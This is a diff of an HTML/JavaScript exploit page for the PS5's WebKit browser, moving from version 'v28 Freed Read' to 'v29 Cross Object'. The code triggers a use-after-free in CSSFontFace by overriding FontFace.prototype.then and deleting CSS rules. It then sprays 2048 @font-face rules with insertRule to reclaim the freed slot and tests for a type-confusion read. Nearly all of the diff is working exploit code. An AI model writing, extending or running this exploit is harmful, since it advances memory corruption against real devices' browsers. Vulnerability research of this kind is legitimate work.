@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v28 - Freed Read</title>
+<title>PS5 v29 - Cross Object</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -29,40 +29,36 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 .ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
 .mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
 .hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
-.cv{position:absolute;left:-9999px;top:-9999px}
 </style>
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v28 FREED</span><span class="s">│</span>
+<span class="l">▶ v29 CROSS</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h3">READ:<b>?</b></span>
 </div>
 <div id="pg"><div id="bar" style="width:0%"></div></div>
 <div id="out"></div>
-<canvas id="cv" width="512" height="128" class="cv"></canvas>
+<canvas id="cv" width="512" height="128" style="position:absolute;left:-9999px"></canvas>
 <script>
 "use strict";
 
 // ============================================================
-//  PS5 v28 — Freed Memory Read
+//  PS5 v29 — Cross-Object Type Confusion
+//  
+//  FROM SOURCE CODE:
+//  CSSFontFace uses WTF_MAKE_FAST_ALLOCATED_WITH_HEAP_IDENTIFIER(CSSFontFace)
+//  This means it has its own IsoHeap. Only CSSFontFace objects can overlap.
 //
-//  FROM SOURCE CODE ANALYSIS:
-//  1. CSSFontFace has own IsoHeap (MAKE_FAST_ALLOCATED_WITH_HEAP_IDENTIFIER)
-//  2. check() returns true by default when no faces found
-//  3. removeFromFacesLookupTable needs face.families() — if freed, may not remove
-//  4. m_facesLookupTable stores Vector<Ref<CSSFontFace>> — dangling RefPtr possible
-//  5. matchingFacesExcludingPreinstalledFonts uses reference_wrapper (no refcount!)
-//
-//  KEY EXPERIMENT: UAF WITHOUT spray → read freed memory directly
-//  In all previous versions we sprayed 4096 faces. Never tried NOT spraying.
-//
-//  If CSSFontFace is freed but pointer remains in m_facesLookupTable:
-//  - load() reads from freed memory
-//  - properties() reads m_propertiesOrCSSConnection from freed object
-//  - status() reads m_status from freed object
-//  - rangesMatchCodePoint() reads m_ranges from freed object
+//  STRATEGY:
+//  1. UAF frees the "x" CSSFontFace.
+//  2. We DO NOT spray via JS FontFace API (that creates loopback).
+//  3. Instead, we use insertRule() to add 4096 @font-face rules for "A_0" to "A_4095".
+//     This forces WebKit to allocate NEW CSSFontFace objects internally.
+//  4. One of these internal CSSFontFace objects lands in the freed "x" slot.
+//  5. When we read "x", we read the properties of "A_NNN"!
+//  6. This is a true cross-object read (type confusion).
 // ============================================================
 
 var O=document.getElementById("out");
@@ -70,8 +66,7 @@ var bar=document.getElementById("bar");
 function pg(p){bar.style.width=p+"%"}
 function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
 function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v28] "+m)}catch(e){}}
+s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
 function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
 function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
 function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
@@ -81,12 +76,12 @@ window.onerror=function(m,s,l){
   Fl("CRASH: "+m.substring(0,60)+" @"+l);
   hu("h3","READ:<b>CRASH</b>");
   P("  CRASH = freed memory was accessed!","er");
-  P("  This CONFIRMS dangling pointer!","er");
   return true;
 };
 
 var keep=[],holes=[];
 var trigger=null,uafOk=false;
+var sh=document.getElementById("s").sheet;
 var ctx=document.getElementById("cv").getContext("2d");
 
 var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
@@ -95,9 +90,8 @@ for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
 function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
 function fs(){try{void document.body.offsetTop}catch(e){}}
 
-// Holes — same as always
 P("════════════════════════════════════","hd");
-P("  v28 — Freed Memory Read","hd");
+P("  v29 — Cross-Object Read","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -115,7 +109,6 @@ fs();Ok("Holes ready");
 pg(10);Hd("Trigger setup...");
 trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
 document.fonts.add(trigger);void trigger.loaded;
-var sh=document.getElementById("s").sheet;
 for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
 fs();
 var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
@@ -124,46 +117,37 @@ for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url
 fs();Ok("Trigger ready");
 
 // ============================================================
-//  UAF — KEY DIFFERENCE: NO SPRAY AFTER UAF!
+//  UAF + CSSOM Spray
 // ============================================================
-pg(20);Hd("UAF trigger (NO spray this time)");
+pg(20);Hd("UAF trigger + CSSRule Spray");
 
 Object.defineProperty(FontFace.prototype,"then",{configurable:true,
 get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","UAF:<b>✅</b>");
-St("UAF WINDOW OPEN — NO SPRAY");
+St("UAF WINDOW OPEN");
 
 try{
-  // Kill cache
   var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
   document.fonts.add(ck);keep.push(ck);
-
-  // Delete the 'x' CSSFontFace rule
   sh.deleteRule(1);fs();
-
-  // Delete flush rules
   while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
+  fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
   fs();
+}catch(e){}
 
-  // Delete some holes
-  for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-  fs();
+// GC pressure
+Dm("GC pressure...");
+for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
 
-  // GC pressure — finalize frees
-  Dm("GC pressure (16MB)...");
-  for(var i=0;i<8;i++){
-    var tmp=[];
-    for(var j=0;j<256;j++)tmp.push(new ArrayBuffer(8192));
-  }
+// RECLAIM VIA CSSRULE!
+// This forces WebKit to internally allocate CSSFontFace objects.
+Dm("Spraying 2048 CSSRules for families A_0 to A_2047...");
+for(var i=0;i<2048;i++){
+  try{
+    sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}", sh.cssRules.length);
+  }catch(e){}
+}
+fs();
 
-  // *** NO SPRAY! ***
-  // In all previous versions we sprayed 4096 FontFace objects here.
-  // This time: DON'T spray. Let the freed CSSFontFace slot stay freed.
-  // When load() runs, it should read from freed memory.
-  
-  Dm("NO SPRAY — freed slot stays freed");
-}catch(e){Fl("UAF prep: "+e.message)}
-
-// Force layout with trigger font
 try{var d=document.createElement("div");d.textContent="AB";
 d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
 document.body.appendChild(d);void d.offsetWidth}catch(e){}
@@ -174,16 +158,18 @@ Dm("UAF window closing");
 var rn=0;var raf=function(){rn++;
 if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
 while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();}catch(e){}}
+fs();for(var i=0;i<2048;i++){
+  try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);unicode-range:U+0042}", sh.cssRules.length)}catch(e){}
+}fs()}catch(e){}}
 if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
 // ============================================================
-//  PHASE 1: Read freed memory via load()
+//  PHASE 1: Read Cross-Object
 // ============================================================
-pg(30);Sep();Hd("PHASE 1: Read Freed Memory");Sep();
+pg(40);Sep();Hd("PHASE 1: Cross-Object Read");Sep();
 
-P("  Calling load() WITHOUT spraying...","dm");
-P("  If CSSFontFace is freed, load() reads freed memory","dm");
+P("  Calling load('1em trigger, x', 'AB')...","dm");
+P("  If freed slot was reclaimed by A_NNN, we read its properties!","dm");
 P("");
 
 document.fonts.load("1em trigger, x","AB").then(function(faces){
@@ -194,84 +180,58 @@ document.fonts.load("1em trigger, x","AB").then(function(faces){
     P("");
     P("  Face["+i+"]:", "hl");
 
-    // Read ALL properties — these read from C++ CSSFontFace
     var props=["family","style","weight","stretch","unicodeRange",
                "variant","featureSettings","display","status"];
 
     for(var pi=0;pi<props.length;pi++){
       try{
         var val=f[props[pi]];
-        var t=typeof val;
-        P("    "+props[pi].padEnd(16)+"= "+val+" ("+t+")",
-          t==="number"&&val>0x1000?"hl":
-          (val===undefined||val===null)?"wr":"ok");
+        P("    "+props[pi].padEnd(16)+"= "+val+" ("+typeof val+")");
       }catch(e){
         P("    "+props[pi].padEnd(16)+"= ERR: "+e.message.substring(0,40),"er");
       }
     }
 
-    // Check for anomalous values (signs of freed memory)
-    try{
-      var st=f.status;
-      if(st!=="loaded"&&st!=="unloaded"&&st!=="loading"&&st!=="error"){
-        St("ANOMALOUS STATUS: "+st);
-        Hi("  This is freed memory content!");
-      }
-    }catch(e){}
-
-    try{
-      var w=f.weight;
-      if(w!=="normal"&&w!=="bold"&&!w.match(/^\d+$/)){
-        St("ANOMALOUS WEIGHT: "+w);
-        Hi("  This might be a leaked pointer!");
-      }
-    }catch(e){}
-
-    try{
-      var fam=f.family;
-      if(fam&&fam!=="trigger"&&fam!=="x"&&!fam.match(/^[a-zA-Z_]/)){
-        St("ANOMALOUS FAMILY: "+fam);
-      }
-    }catch(e){}
+    // Check for cross-object read
+    if(f.family && f.family.indexOf("A_") === 0){
+      St("CROSS-OBJECT READ CONFIRMED!");
+      Hi("  Read family 'x' but got properties of " + f.family);
+      Hi("  This is a true Type Confusion!");
+    }
   }
 
-  // Keep reference
   keep.push(faces);
-  phase2(faces);
+  phase2();
 
 }).catch(function(e){
-  Fl("load() rejected: "+e.message);
+  Fl("load() rejected: " + e.message);
   Hi("REJECTION = freed memory access attempted!");
-  phase2(null);
+  phase2();
 });
 
 // ============================================================
-//  PHASE 2: check() on freed memory
+//  PHASE 2: check() behavior
 // ============================================================
-function phase2(loadFaces){
-  pg(45);Sep();Hd("PHASE 2: check() on Freed Memory");Sep();
+function phase2(){
+  pg(70);Sep();Hd("PHASE 2: check() Analysis");Sep();
 
-  P("  Testing check() behavior on freed selector...","dm");
+  P("  Testing check() behavior...","dm");
   P("");
 
   var checks=[
-    ["64px trigger","A"],
-    ["64px trigger","B"],
-    ["64px x","A"],
     ["64px x","B"],
-    ["900 italic 64px trigger","A"],
-    ["100 normal 64px x","B"],
-    ["64px zzz_nonexistent","A"]
+    ["64px A_0","B"],
+    ["64px A_100","B"],
+    ["64px A_2000","B"],
+    ["64px zzz_nonexistent","B"]
   ];
 
   for(var ci=0;ci<checks.length;ci++){
     try{
       var r=document.fonts.check(checks[ci][0],checks[ci][1]);
-      P("  check('"+checks[ci][0]+"', '"+checks[ci][1]+"') = "+r,
-        r?"hl":"dm");
+      P("  check('"+checks[ci][0]+"', '"+checks[ci][1]+"') = "+r, r?"hl":"dm");
     }catch(e){
-      P("  check('"+checks[ci][0]+"') → ERR: "+e.message.substring(0,30),"er");
-      Hi("  EXCEPTION = freed memory read!");
+      P("  check('"+checks[ci][0]+"') → ERR","er");
     }
   }
 
@@ -279,219 +239,30 @@ function phase2(loadFaces){
 }
 
 // ============================================================
-//  PHASE 3: Minimal spray — 1 face at a time
-//  Spray ONE face, check, spray another, check...
-//  Find which spray index reclaims the freed slot
+//  PHASE 3: Add CSSRule for "x" and test
 // ============================================================
 function phase3(){
-  pg(60);Sep();Hd("PHASE 3: Binary Search Reclamation");Sep();
+  pg(90);Sep();Hd("PHASE 3: CSSRule Override");Sep();
 
-  P("  Spraying 1 face at a time to find reclamation point...","dm");
-  P("");
-
-  var sprayFaces=[];
-  var foundIdx=-1;
-
-  // Spray in small batches
-  for(var batch=0;batch<8;batch++){
-    var batchStart=batch*64;
-
-    for(var i=0;i<64;i++){
-      try{
-        var idx=batchStart+i;
-        var f=new FontFace("S_"+idx,mkBuf(),{
-          unicodeRange:"U+0042",
-          style:"italic",
-          weight:String(100+(idx%9)*100),
-          display:["auto","block","swap","fallback"][idx%4]
-        });
-        document.fonts.add(f);
-        sprayFaces.push(f);
-      }catch(e){}
-    }
+  P("  Adding CSSRule for 'x' to see if it overrides...","dm");
+  try{
+    var xIdx=sh.insertRule("@font-face{font-family:x;src:local(Courier);font-weight:400;unicode-range:U+0042}", sh.cssRules.length);
     fs();
-
-    // Check if load() returns a spray face
-    // Use synchronous check first
-    var chk=document.fonts.check("64px x","B");
-    P("  After batch "+batch+" (S_"+batchStart+"-S_"+(batchStart+63)+"): check="+chk,
-      !chk?"hl":"dm");
-
-    // If check changed, the freed slot was reclaimed
-    if(!chk&&foundIdx<0){
-      foundIdx=batchStart;
-      Hi("  CHECK CHANGED at batch "+batch+"!");
-    }
-  }
-
-  if(foundIdx>=0){
-    St("RECLAMATION at batch "+foundIdx+"!");
-    P("  The freed CSSFontFace slot was reclaimed by S_"+foundIdx+"-S_"+(foundIdx+63),"hl");
-  }else{
-    P("  No reclamation detected via check()","dm");
-  }
-
-  // Now try load() with spray faces present
-  P("");
-  P("  Trying load() with spray faces present...","dm");
-
-  document.fonts.load("1em trigger, x","AB").then(function(faces){
-    P("  load() returned "+faces.length+" faces","hl");
-
-    for(var i=0;i<faces.length;i++){
-      var f=faces[i];
-      P("    ["+i+"] family="+f.family+" style="+f.style+
-        " weight="+f.weight+" status="+f.status);
-
-      // Check if a spray face appeared
-      if(f.family&&f.family.indexOf("S_")===0){
-        St("SPRAY FACE RECLAIMED: "+f.family);
-        Hi("  weight="+f.weight+" style="+f.style);
-        Hi("  This is the reclaimed CSSFontFace slot!");
+    
+    document.fonts.load("1em trigger, x","AB").then(function(f){
+      P("  After CSSRule: load() returned "+f.length+" faces","hl");
+      for(var i=0;i<f.length;i++){
+        P("    ["+i+"] family="+f[i].family+" weight="+f[i].weight);
       }
-    }
-
-    keep.push(faces);
-    phase4(sprayFaces,faces);
-
-  }).catch(function(e){
-    Fl("load with spray: "+e.message);
-    phase4(sprayFaces,null);
-  });
+      
+      pg(100);Sep();Hd("SUMMARY");Sep();
+      P("");
+      P("  If Phase 1 showed A_NNN, we have primitive!","hl");
+      P("  If not, CSSOM spray didn't hit the slot.","dm");
+      hu("h3","READ:<b>DONE</b>");
+    });
+  }catch(e){Fl("CSSRule: "+e.message)}
 }
-
-// ============================================================
-//  PHASE 4: Read properties of reclaimed face
-//  If a spray face reclaimed the slot, read ALL its properties
-//  and compare with what we set
-// ============================================================
-function phase4(sprayFaces,loadFaces){
-  pg(75);Sep();Hd("PHASE 4: Reclaimed Face Analysis");Sep();
-
-  if(!loadFaces||loadFaces.length===0){
-    P("  No faces to analyze","dm");
-    phase5();
-    return;
-  }
-
-  P("  Analyzing all returned faces...","dm");
-  P("");
-
-  for(var i=0;i<loadFaces.length;i++){
-    var f=loadFaces[i];
-
-    P("  Face["+i+"]: "+f.family, "hl");
-
-    // Try to find this face in our spray array
-    var sprayRef=null;
-    for(var j=0;j<sprayFaces.length;j++){
-      if(sprayFaces[j].family===f.family){
-        sprayRef=sprayFaces[j];
-        break;
-      }
-    }
-
-    if(sprayRef){
-      P("    Found in spray array at index "+j);
-      P("    Spray weight: "+sprayRef.weight+" → Load weight: "+f.weight,
-        sprayRef.weight!==f.weight?"hl":"ok");
-      P("    Spray style: "+sprayRef.style+" → Load style: "+f.style,
-        sprayRef.style!==f.style?"hl":"ok");
-
-      if(sprayRef.weight!==f.weight||sprayRef.style!==f.style){
-        St("PROPERTY MISMATCH = READING FROM DIFFERENT C++ OBJECT!");
-        Hi("  The JS wrapper reads from one CSSFontFace");
-        Hi("  But load() reads from the RECLAIMED one!");
-        Hi("  This IS type confusion!");
-      }
-    }else{
-      P("    NOT found in spray array — might be freed memory!","wr");
-
-      // Read all properties
-      var props=["family","style","weight","stretch","unicodeRange",
-                 "featureSettings","display","status"];
-      for(var pi=0;pi<props.length;pi++){
-        try{
-          P("    "+props[pi].padEnd(16)+"= "+f[props[pi]]);
-        }catch(e){
-          P("    "+props[pi].padEnd(16)+"= ERR","er");
-        }
-      }
-    }
-  }
-
-  phase5();
-}
-
-// ============================================================
-//  PHASE 5: Status-based oracle
-//  From source: check() returns false only if status=Pending or Loading
-//  If we control the status of the reclaimed face = oracle!
-// ============================================================
-function phase5(){
-  pg(90);Sep();Hd("PHASE 5: Status Oracle Test");Sep();
-
-  P("  From source code: check() returns false if status=Pending/Loading","dm");
-  P("  Testing if we can control status of reclaimed face...","dm");
-  P("");
-
-  // Create faces with different statuses
-  // FontFace with valid buffer → status=loaded (after load)
-  // FontFace with invalid data → status=error
-  // FontFace not yet loaded → status=unloaded
-
-  var statusTests=[
-    {label:"valid buffer",src:mkBuf(),expectedStatus:"loaded"},
-    {label:"invalid buffer",src:new ArrayBuffer(64),expectedStatus:"error"},
-    {label:"empty buffer",src:new ArrayBuffer(0),expectedStatus:"error"}
-  ];
-
-  for(var si=0;si<statusTests.length;si++){
-    var t=statusTests[si];
-    try{
-      var f=new FontFace("STAT_"+si,t.src,{unicodeRange:"U+0042"});
-      document.fonts.add(f);fs();
-      keep.push(f);
-
-      // Force load
-      f.load().then(function(face){
-        var st=face.status;
-        var chk=document.fonts.check("64px x","B");
-        P("  "+t.label.padEnd(16)+" → status="+st+" check(x,B)="+chk,
-          chk!==undefined?"hl":"dm");
-      }).catch(function(e){
-        P("  "+t.label.padEnd(16)+" → REJECTED","er");
-      });
-    }catch(e){
-      P("  "+t.label+": ERR","er");
-    }
-  }
-
-  // ============================================================
-  //  SUMMARY
-  // ============================================================
-  setTimeout(function(){
-    pg(100);Sep();Hd("FINAL SUMMARY");Sep();
-    P("");
-    P("  UAF:                 ✅ (without spray)");
-    P("  load() on freed:     See Phase 1");
-    P("  check() on freed:    See Phase 2");
-    P("  Reclamation point:   "+(foundIdx>=0?"batch "+foundIdx:"not found"));
-    P("  Property mismatch:   See Phase 4");
-    P("  Status oracle:       See Phase 5");
-    P("");
-    P("  KEY FINDINGS:","hl");
-    P("  1. Did load() read freed memory? (Phase 1)","dm");
-    P("  2. Did check() crash or return anomalous? (Phase 2)","dm");
-    P("  3. Which spray batch reclaimed the slot? (Phase 3)","dm");
-    P("  4. Property mismatch = type confusion? (Phase 4)","dm");
-    P("");
-    hu("h3","READ:<b>DONE</b>");
-  },2000);
-}
-
-// Variable for phase3
-var foundIdx=-1;
 </script>
 </body>
 </html>
